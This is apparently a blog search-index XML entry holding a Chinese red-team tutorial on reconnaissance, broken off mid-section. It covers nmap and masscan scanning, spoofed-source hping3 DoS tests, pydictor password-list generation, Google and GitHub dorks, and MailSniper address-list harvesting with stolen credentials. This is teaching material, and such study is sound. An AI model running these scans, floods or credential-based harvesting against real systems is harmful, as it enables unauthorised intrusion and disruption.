<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>红队攻防学习之信息收集</title>
    <link href="/p/a184e79.html"/>
    <url>/p/a184e79.html</url>
    
    <content type="html"><![CDATA[<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>官网: <a href="https://nmap.org/">https://nmap.org/</a><br>安装系统及命令:</p><ul><li><p>Mac os: <code>brew install nmap</code></p></li><li><p>Centos: <code>yum install nmap</code></p></li><li><p>Ubuntu: <code>apt一get install nmap</code></p></li></ul><p>参考手册: <a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p><h4 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a><strong>扫描方式</strong></h4><p>常见的七种扫描方式：</p><ul><li><p>ТСР: -sT</p></li><li><p>SYN: -sS</p></li><li><p>ACK: -sA</p></li><li><p>UDP: -sU</p></li><li><p>RPC: -sR</p></li><li><p>ICMP: -sP</p></li><li><p>Disable Port Scan: -sn</p></li></ul><p>最常见的这些参数解释：<a href="https://blog.csdn.net/liudongdong19/article/details/83506731">https://blog.csdn.net/liudongdong19/article/details/83506731</a></p><h4 id="常见扫描案例"><a href="#常见扫描案例" class="headerlink" title="常见扫描案例"></a><strong>常见扫描案例</strong></h4><ul><li>扫描10000端口、操作系统、版本</li></ul><pre><code class="hljs bash">nmap -T4 -A &lt;target&gt;</code></pre><ul><li>版本探测</li></ul><pre><code class="hljs bash">nmap -sV &lt;target&gt;</code></pre><ul><li>操作系统</li></ul><pre><code class="hljs bash">nmap -O &lt;target&gt;</code></pre><ul><li>其他常用技巧：</li></ul><pre><code class="hljs bash">--host-timeout 主机超时时间 通常选值：18000--scan-delay 报文时间间隔 通常选值：1000-s &lt;源地址&gt; 定义扫描源地址，为了不被发现</code></pre><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre><code class="hljs bash">nmap -V -iR 100000 -PO -p 80</code></pre><p>随机选择100000台主机扫描是否运行Web服务器（80端口）。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-PO禁止对主机列表。</p><pre><code class="hljs bash">host -l company.com | cut -d -f 4 | nmap -V -iL -</code></pre><p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给Nmap。上述命令用于GNU/Linux —— 其它系统进行区域传输时有不同的命令。</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a><strong>输出</strong></h4><pre><code class="hljs bash">-oN &lt;File&gt;-oX &lt;XML File&gt;-oG &lt;filespec&gt;</code></pre><p>Grep输出参考：<a href="http://www.unspecific.com/nmap-oG-output/">http://www.unspecific.com/nmap-oG-output/</a></p><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>安装:</p><pre><code class="hljs bash">$ sudo apt-get install git gcc make libpcap一dev$ git <span class="hljs-built_in">clone</span> https://github.com/ rober tdavidgr aham/ masscan$ <span class="hljs-built_in">cd</span> masscan$ make</code></pre><blockquote><p>该工具兼容Nmap的参数高级选项</p></blockquote><h4 id="高级选项"><a href="#高级选项" class="headerlink" title="高级选项"></a><strong>高级选项</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/01.png" alt="msscan"><br>命令：<code>sudo masscan --ports 1-10000 192.168.1.101 --adapter-ip 192.168.1.1</code></p><ul><li>-adapter-ip 指定发包的IP地址</li><li>-adapter-port 指定发包的源端口</li><li>-adapter-mac 指定发包的源MAC地址</li><li>-router-mac 指定网关的MAC地址</li><li>-exclude IP地址范围黑名单，防止masscan扫描</li><li>-excludefile 指定IP地址范围黑名单文件</li><li>-includefile，-iL 读取一个范围列表进行扫描</li><li>-wait 指定发送完包之后的等待时间，默认为10秒</li></ul><p>命令：<code>masscan -p 1-65535 192.168.1.101 --rate=100</code><br>在网络环境慢的情况下，快速扫描出存在端口与nmap配合</p><hr><h3 id="Nbtscan"><a href="#Nbtscan" class="headerlink" title="Nbtscan"></a>Nbtscan</h3><p>kali系统自带nbtscan，以及查看帮助说明</p><pre><code class="hljs bash">ice@iceH:~/Desktop$ whereis nbtscannbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gzice@iceH:~/Desktop$ nbtscan NBTscan version 1.6.This is a free software and it comes with absolutely no warranty.You can use, distribute and modify it under terms of GNU GPL 2+.Usage:nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) ......</code></pre><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/02.png" alt="nbtscan"><br>nbtscan扫描可以发现主机名、MAC addr等信息…</p><ul><li>扫描整个C段</li></ul><pre><code class="hljs bash">nbtscan -r 192.168.1.0/24</code></pre><ul><li>扫描一个范围</li></ul><pre><code class="hljs bash">nbtscan 192.168.1.1-100</code></pre><ul><li>以:分割显示结果</li></ul><pre><code class="hljs bash">nbtscan -v -s : 192.168.1.0/24</code></pre><ul><li>从文件读取扫描范围</li></ul><pre><code class="hljs bash">nbtscan -f &lt;File&gt;</code></pre><h4 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a><strong>高级用法</strong></h4><pre><code class="hljs bash">sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | uniq</code></pre><pre><code class="hljs bash">ice@iceH:~/Desktop$ sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105192.168.1.105 GOOGLE-28D12ECA 00U192.168.1.105 GOOGLE-28D12ECA 20U192.168.1.105 WORKGROUP       00G192.168.1.105 WORKGROUP       1eG192.168.1.105 WORKGROUP       1dU192.168.1.105 __MSBROWSE__ 01G192.168.1.105 MAC 00:0c:29:f5:84:34ice@iceH:~/Desktop$ sudo nbtscan -v -s <span class="hljs-string">&#x27; &#x27;</span> 192.168.1.105 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | uniq192.168.1.105</code></pre><hr><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>hping3主要测试防火墙的拦截规则，对网络设备进行测试</p><h4 id="常用模式"><a href="#常用模式" class="headerlink" title="常用模式"></a><strong>常用模式</strong></h4><ul><li>-0 -rawip IP原始报文</li><li>-1 -icmp ICMP模式</li><li>-2 -udp UDP模式</li><li>-8 -scan 扫描模式</li><li>-9 -listen 监听模式</li></ul><blockquote><p>SYN方式扫描主机端口</p></blockquote><pre><code class="hljs bash">hping3 --scan 445,135 -S 192.168.1.105</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/03.png" alt="hping3"></p><p>可以看到，目标主机回复了: S…A，代表SYN/ACK</p><blockquote><p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）</p></blockquote><pre><code class="hljs bash">hping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c 5</code></pre><h4 id="DRDDOS"><a href="#DRDDOS" class="headerlink" title="DRDDOS"></a><strong>DRDDOS</strong></h4><blockquote><p>基于UDP的DOS</p></blockquote><pre><code class="hljs bash">hping3 -udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5</code></pre><p><strong>参考</strong></p><p><a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a>    –很详细用法的解释<br><a href="http://man.linuxde.net/hping3">http://man.linuxde.net/hping3</a></p><hr><h2 id="2、关联信息生成"><a href="#2、关联信息生成" class="headerlink" title="2、关联信息生成"></a>2、关联信息生成</h2><p>在渗透前期工作开展之前，需要对目标的各种信息进行分析、拆分、组合<br>例如:赫尔巴斯亚基国<br>根据地域习惯、宗教、互联网开放信息等信息进行简要拆分，假设获取的信息如下:</p><ul><li>当地人爱好吃橙子</li><li>当地人信奉伊斯兰教</li><li>IPV4地址开放IP段</li><li>相关社交网络公 开的数据库</li></ul><p>根据宗教、习惯、IP地址、 开放数据支持…等，为后续的字典生成、鱼叉、水坑攻击铺下基石</p><h3 id="字典生成：pydictor"><a href="#字典生成：pydictor" class="headerlink" title="字典生成：pydictor"></a>字典生成：pydictor</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装:"></a><strong>安装:</strong></h4><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/LandGrey/pydictor</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/04.png" alt="安装"></p><h4 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h4><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/05.png" alt="生成字典"></p><p>命令：<code>python pydictor.py --sedb</code></p><pre><code class="hljs bash">python pydictor.py --sedb<span class="hljs-built_in">set</span> cname liwei<span class="hljs-built_in">set</span> sname lw Lwei<span class="hljs-built_in">set</span> ename zwell<span class="hljs-built_in">set</span> birth 19880916<span class="hljs-built_in">set</span> usedpwd liwei123456. liwei@19880916 lw19880916_123<span class="hljs-built_in">set</span> phone 18852006666<span class="hljs-built_in">set</span> uphone 15500998080<span class="hljs-built_in">set</span> hphone 76500100 61599000 01061599000<span class="hljs-built_in">set</span> email 33125500@qq.com<span class="hljs-built_in">set</span> email 13561207878@163.com<span class="hljs-built_in">set</span> email weiweili@gmail.com<span class="hljs-built_in">set</span> email wei010wei@hotmail.com<span class="hljs-built_in">set</span> postcode 663321 962210<span class="hljs-built_in">set</span> nickname zlili<span class="hljs-built_in">set</span> idcard 152726198809160571<span class="hljs-built_in">set</span> jobnum 20051230 100563<span class="hljs-built_in">set</span> otherdate 19591004 19621012<span class="hljs-built_in">set</span> otherdate 19870906 19880208<span class="hljs-built_in">set</span> usedchar tiger gof gamesthrones 176003 m0n5ter ppdogrun</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/06.png" alt="生成字典"></p><h4 id="合并去重"><a href="#合并去重" class="headerlink" title="合并去重"></a><strong>合并去重</strong></h4><pre><code class="hljs bash">python pydictor.py -tool uniqbiner /my/all/dict/</code></pre><h4 id="多字典文件组合工具"><a href="#多字典文件组合工具" class="headerlink" title="多字典文件组合工具"></a><strong>多字典文件组合工具</strong></h4><pre><code class="hljs bash">python pydictor.py -tool hybrider heads.txt some_others.txt tails.txt</code></pre><p>参考详细：<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p><hr><h2 id="3、开放漏洞情报"><a href="#3、开放漏洞情报" class="headerlink" title="3、开放漏洞情报"></a>3、开放漏洞情报</h2><h3 id="常用网站"><a href="#常用网站" class="headerlink" title="常用网站"></a>常用网站</h3><ul><li>CVE：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></li><li>Exploit-DB：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li><li>CX Security：<a href="https://cxsecurity.com/">https://cxsecurity.com/</a></li><li>CNVD：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></li><li>securitytracker：<a href="https://www.securitytracker.com/">https://www.securitytracker.com/</a></li></ul><h3 id="Search-Exploit一DB"><a href="#Search-Exploit一DB" class="headerlink" title="Search Exploit一DB"></a>Search Exploit一DB</h3><h4 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h4><p>利用 <code>searchsploit apache 5.3.12</code> ，搜索apache漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/07.png" alt="搜索漏洞"></p><h4 id="更新最新exp库"><a href="#更新最新exp库" class="headerlink" title="更新最新exp库"></a>更新最新exp库</h4><p>命令：<code>searchsploit -u</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/08.png" alt="更新最新exp库"></p><hr><h2 id="4、开源情报信息搜集-OSINT"><a href="#4、开源情报信息搜集-OSINT" class="headerlink" title="4、开源情报信息搜集(OSINT)"></a>4、开源情报信息搜集(OSINT)</h2><h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><ul><li>百度：<a href="https://www.baidu.com/">https://www.baidu.com</a></li><li>谷歌：<a href="https://www.google.com/">https://www.google.com</a></li><li>必应：<a href="https://cn.bing.com/">https://cn.bing.com</a></li></ul><h3 id="在线接口"><a href="#在线接口" class="headerlink" title="在线接口"></a>在线接口</h3><ul><li><a href="http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com">http://ce.baidu.com/index/getrelatedsites?site_address=baidu.com</a></li><li><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></li><li><a href="http://sbd.ximcx.cn/">http://sbd.ximcx.cn/</a>  –在线子域名查询-接口光速版</li><li><a href="https://censys.io/certificates?q=.example.com">https://censys.io/certificates?q=.example.com</a></li><li><a href="https://crt.sh/?q=%25.example.com">https://crt.sh/?q=%25.example.com</a></li><li><a href="https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu">https://github.com/c0ny1/workscripts/tree/master/get-subdomain-from-baidu</a></li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a>  –查询DNS记录、侦查、研究</li><li><a href="https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com">https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=baidu.com</a>  –和第一个一样</li><li><a href="https://findsubdomains.com/">https://findsubdomains.com/</a></li><li><a href="https://dnslytics.com/search?g=www.baidu.com">https://dnslytics.com/search?g=www.baidu.com</a>   –DNSlyrics</li><li><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a>   –DNS攻击面2次免费</li><li><a href="https://viewdns.info/">https://viewdns.info/</a>   –功能很多</li><li><a href="https://www.ipneighbour.com/#/lookup/114.114.114.114">https://www.ipneighbour.com/#/lookup/114.114.114.114</a>      –邻居发现</li><li><a href="https://securitytrails.com/list/apex_domain/baidu.com">https://securitytrails.com/list/apex_domain/baidu.com</a></li><li><a href="https://url.fht.im/">https://url.fht.im/</a></li><li><a href="http://api.hackertarget.com/hostsearch/?q=baidu.com">http://api.hackertarget.com/hostsearch/?q=baidu.com</a></li><li><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a>     –云悉（限制挺大）</li></ul><p>有几个挺好用的，自行挖掘…</p><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><ul><li><a href="https://github.com/rshipp/awesome-malware-analysis/blob/master/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">https://github.com/rshipp/awesome-malware-analysis/blob/master/恶意软件分析大合集.md</a></li></ul><p>此网站极力推荐学习！！！</p><hr><h2 id="5、Github-Hacking"><a href="#5、Github-Hacking" class="headerlink" title="5、Github Hacking"></a>5、Github Hacking</h2><p>您可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有Github存储库</p><ul><li>Repositories </li><li>Topics</li><li>Issues and pull requests </li><li>Code </li><li>Commits </li><li>Users </li><li>Wikis </li></ul><p>参考 :</p><ul><li>Searching for repositories </li><li>Searching topics</li><li>Searching code </li><li>Searching commits </li><li>Searching issues and pull requests </li><li>Searching users </li><li>Searching wikis </li><li>Searching in forks </li></ul><p>可以使用以上方式<code>搜索</code>页面或<code>高级搜索</code>页面搜索Github<br>您可以使用<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，和<code>&lt;=</code>搜索是<code>大于</code>，<code>大于或等于</code>，<code>小于</code>和<code>小于或等于</code>另一个值的值<br>下面会介绍如何搜索</p><h3 id="搜索仓库"><a href="#搜索仓库" class="headerlink" title="搜索仓库"></a><strong>搜索仓库</strong></h3><table><thead><tr><th align="center">Query</th><th align="center">Example</th></tr></thead><tbody><tr><td align="center">&gt;_n</td><td align="center">cats stars:&gt;1000匹配关键字”cats”且star大于1000的仓库</td></tr><tr><td align="center">&gt;=<em>n</em></td><td align="center">cats topIcs:&gt;=5匹配关键字”cats”且标签数量大于等于5的仓库</td></tr><tr><td align="center">&lt;_n_</td><td align="center">cats size:&lt;10000匹配关键字”cats”且文件小于10KB的仓库</td></tr><tr><td align="center">&lt;=_n_</td><td align="center">cats stars:&lt;=50匹配关键字”cats”且star小于等于50的仓库</td></tr><tr><td align="center">_n_..*</td><td align="center">cats stars:10..*匹配关键字”cats”且star大于等于10的仓库</td></tr><tr><td align="center">*.._n_</td><td align="center">cats stars:*..10匹配关键字”cats”且star小于等于10的仓库</td></tr><tr><td align="center">n..n</td><td align="center">cats stars:10..50匹配关键字”cats”且star大于10且小于50的仓库</td></tr></tbody></table><h3 id="搜索代码"><a href="#搜索代码" class="headerlink" title="搜索代码"></a>搜索代码</h3><p><strong>注意事项</strong></p><ul><li>只能搜索小于384KB的文件 </li><li>只能搜索少于500,000个文件的存储库，登录的用户可以搜索所有公共存储库</li><li>除filename搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索language: Javascript无效,而是这样: amazing language:Javascript </li><li>搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。您不能将以下通配符用作搜索查询的一部分“.、! “ = * ! ? # $ &amp; + ^ | ~ &lt;  &gt; ( ) { } [ ] 搜索将忽略这些符号</li></ul><p><strong>日期条件</strong></p><ul><li>cats pushed:&lt;2012-07-05 搜索在2012年07月05日前push代码，且cats作为关键字</li><li>cats pushed:2016-04-30..2016-07-04  日期区间</li><li>cats created:&gt;=2017-04-01  创建时间</li></ul><p><strong>逻辑运算</strong></p><ul><li>AND、OR、NOT</li></ul><p><strong>排除运算</strong></p><ul><li>cats pushed:&lt;2012-07-05 language:java  搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</li></ul><p><strong>包含搜索</strong></p><ul><li>cats in:file            搜索文件中包含cats的代码<ul><li>cats in:path        搜索路径中包含cats的代码 <ul><li>cats in:path,file搜索路径、文件中包含cats的代码</li></ul></li></ul></li><li>console path:app/public language:javascript  搜索关键字 console，且语言为javascript，在app/public下的代码</li></ul><p><strong>主体搜索</strong></p><ul><li>user: USERNAME                                用户名搜索<ul><li>org: ‘’ORGNAME                                组织搜索 <ul><li>repo: USERNAME/REPOSITORY指定仓库搜索 </li></ul></li></ul></li></ul><p><strong>文件大小</strong></p><ul><li>size:&gt;1000        搜索大小大于1KB的文件</li></ul><p><strong>文件名称</strong></p><p><code>filename:config.php language:php</code> 搜索文件名为<code> config.php</code>，且语言为<code>php</code>的代码<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/09.png" alt="github hacking"></p><p>搜索Java项目配置文件: <code>mail filename:.properties</code><br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/10.png" alt="github hacking"></p><p><strong>扩展名</strong></p><p>搜索<code>extension:yaml mongolab.com</code> 中存在的代码信息等<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/11.png" alt="github hacking"></p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p><code>https://github.com/unkl4b/gitmIner</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/12.png" alt="自动化工具"></p><hr><h2 id="6、google-hacking"><a href="#6、google-hacking" class="headerlink" title="6、google hacking"></a>6、google hacking</h2><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/13.png" alt="google hacking"></p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h3><ul><li>Intitle             包含标题 <ul><li>Intext          包含内容 <ul><li>filetype     文件类型 <ul><li>Info     基本信息 <ul><li>site 指定网站 </li><li>inurl 包含某个url</li><li>link 包含指定链接的网页 </li><li>cache 显示页面的缓存版本</li></ul></li><li>numberange搜索一个数字</li></ul></li></ul></li></ul></li></ul><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h3><ul><li>搜索目标包含后台的页面</li></ul><p>命令：<code>inurl:/admin intext: 后台管理系统</code></p><p><code>site:&quot;some-keywords.com&quot;intitle: login intext: intext: 管理|后台|登陆|用户名|密码|验证码|系统|帐号| manage|admin|login|system</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/14.png" alt="google hacking"></p><ul><li>搜索目标是否有目录列表</li></ul><p>命令：<code>intext: index of / | ../ | Parent Directory</code></p><p><code>site:&quot;some-keywords.com&quot; intext: index of / | ../ | Parent Directory</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/15.png" alt="google hacking"></p><p>可看到存在目录列表很多url</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/16.png" alt="google hacking"></p><hr><h2 id="7、Git-all-secret"><a href="#7、Git-all-secret" class="headerlink" title="7、Git-all-secret"></a>7、Git-all-secret</h2><p>略过这个，等有精力再研究</p><hr><h2 id="8、mailsniper-ps1获取outlook所有联系人"><a href="#8、mailsniper-ps1获取outlook所有联系人" class="headerlink" title="8、mailsniper.ps1获取outlook所有联系人"></a>8、mailsniper.ps1获取outlook所有联系人</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>掌握其中一个用户邮箱的账号密码，并且可以登录outlook<br>outlook地址可以是官方的也可以是目标自己搭建的，并无影响</p><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h3><p>获取目标邮箱里的所有联系人，方便后续爆破弱口令等等</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>将尝试 <code>Outlook Web Access（OWA）</code>和<code>Exchange Web服务（EWS）</code>的方法。此命令可用于从Exchange收集电子邮件列表 ：</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> <span class="hljs-string">&quot;outlook地址&quot;</span> <span class="hljs-literal">-UserName</span> <span class="hljs-string">&quot;域名/域用户名&quot;</span> <span class="hljs-literal">-Password</span> <span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-literal">-OutFile</span> global<span class="hljs-literal">-address</span><span class="hljs-literal">-list</span>.txt</code></pre><h4 id="可以自己搭建目标outlook在自己服务器上"><a href="#可以自己搭建目标outlook在自己服务器上" class="headerlink" title="可以自己搭建目标outlook在自己服务器上"></a><strong>可以自己搭建目标outlook在自己服务器上</strong></h4><p>此处使用klion的域环境模拟<br>在<code>mailsniper. ps1</code>最后一行加入以下代码,也可以通过传参的形式调用</p><pre><code class="hljs powershell"><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> mail.domain.com <span class="hljs-literal">-UserName</span> domain\username <span class="hljs-literal">-Password</span> Fall2016 <span class="hljs-literal">-OutFile</span> global<span class="hljs-literal">-address</span><span class="hljs-literal">-list</span>.txt</code></pre><p>尝试使用我们传递的账号密码去登录目标的outlook，成功登录后会把邮件里的联系人都获取下来，并输出保存到文件里</p><h4 id="目标outlook在Office365"><a href="#目标outlook在Office365" class="headerlink" title="目标outlook在Office365"></a>目标outlook在Office365</h4><p>道理也是一样的，把<code>ExchHostname</code>指向<code>outlook.office365.com</code>即可，username使用完整的邮箱不要是用户名即可</p><pre><code class="hljs css"><span class="hljs-selector-tag">Get-GlobalAddressList</span> <span class="hljs-selector-tag">-ExchHostname</span> <span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.office365</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">-Username</span> 用户名@邮箱.....</code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><ul><li><a href="https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/">https://www.blackhillsinfosec.com/abusing-exchange-mailbox-permissions-mailsniper/</a></li><li><a href="https://www.cnblogs.com/backlion/p/6812690.html">https://www.cnblogs.com/backlion/p/6812690.html</a></li></ul><h3 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a><strong>工具地址</strong></h3><p><code>https://github.com/dafthack/mailsniper</code></p><hr><h2 id="9、内网渗透之信息收集"><a href="#9、内网渗透之信息收集" class="headerlink" title="9、内网渗透之信息收集"></a>9、内网渗透之信息收集</h2><h3 id="Windows（工作组和域）"><a href="#Windows（工作组和域）" class="headerlink" title="Windows（工作组和域）"></a>Windows（工作组和域）</h3><h4 id="检查当前shell权限"><a href="#检查当前shell权限" class="headerlink" title="检查当前shell权限"></a><strong>检查当前shell权限</strong></h4><pre><code 